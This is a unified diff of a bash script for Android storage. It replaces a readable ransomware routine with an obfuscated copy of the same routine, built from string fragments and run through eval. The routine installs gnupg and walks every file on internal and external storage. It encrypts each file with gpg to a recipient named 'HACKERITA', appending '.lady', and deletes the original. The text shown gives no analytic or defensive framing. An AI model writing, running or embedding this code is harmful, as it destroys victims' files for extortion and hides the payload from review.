@@ -1,12 +1,3 @@
-#!/usr/bin/bash
-yes|apt install gnupg >/dev/null 2>/dev/null
-SD0="/storage/emulated/0"
-SD1=$(df|tail -n 2|awk -F " " '{print $6}'|grep -iv "emulated"|head -n 1)
-T1=$(find $SD0 -type f)
-T2=$(find $SD1 -type f)
-for i in ${T1[*]} ${T2[*]};do
-mv "$i" "${i// /-}" 2>/dev/null
-[[ -O $i ]] && chmod +rwx $i
-[[ -w $i ]] && gpg -e -q -o $i.lady -r HACKERITA $i
-[[ -e $i.lady ]] && rm $i
-done
+z="
+";Zz='t $6';Jz='SD0=';TBz=' -o ';Tz='l -n';Uz=' 2|a';ZBz=' $i';Sz='|tai';rz='for ';GBz='ev/n';IBz='[[ -';SBz='e -q';WBz='-r H';QBz='&& g';Pz='"';MBz='hmod';eBz='rm $';Cz='inst';Qz='SD1=';Nz='ulat';vz='} ${';DBz='// /';Oz='ed/0';Rz='$(df';NBz=' +rw';Mz='e/em';Hz='null';tz=' ${T';Iz=' 2>/';Yz='prin';Gz='dev/';PBz='w $i';sz='i in';VBz='ady ';mz='D0 -';gBz='done';bBz='.lad';oz=' f)';Fz='g >/';pz='T2=$';JBz='O $i';Wz='F " ';dz='"emu';gz='ead ';Dz='all ';CBz='"${i';FBz='2>/d';YBz='RITA';Lz='orag';XBz='ACKE';lz='d $S';bz='rep ';LBz='&& c';az='}'\''|g';uz='1[*]';OBz='x $i';fz='d"|h';dBz=' && ';wz='T2[*';KBz=' ]] ';Ez='gnup';aBz='e $i';xz=']};d';HBz='ull';kz='(fin';Kz='"/st';cz='-iv ';cBz='y ]]';nz='type';ez='late';Az='yes|';Vz='wk -';hz='-n 1';RBz='pg -';jz='T1=$';iz=')';ABz='mv "';Bz='apt ';fBz='i';qz='D1 -';UBz='$i.l';BBz='$i" ';Xz='" '\''{';yz='o';EBz='-}" ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Gz$Hz$z$Jz$Kz$Lz$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$z$jz$kz$lz$mz$nz$oz$z$pz$kz$lz$qz$nz$oz$z$rz$sz$tz$uz$vz$wz$xz$yz$z$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$z$IBz$PBz$KBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$z$IBz$aBz$bBz$cBz$dBz$eBz$fBz$z$gBz"
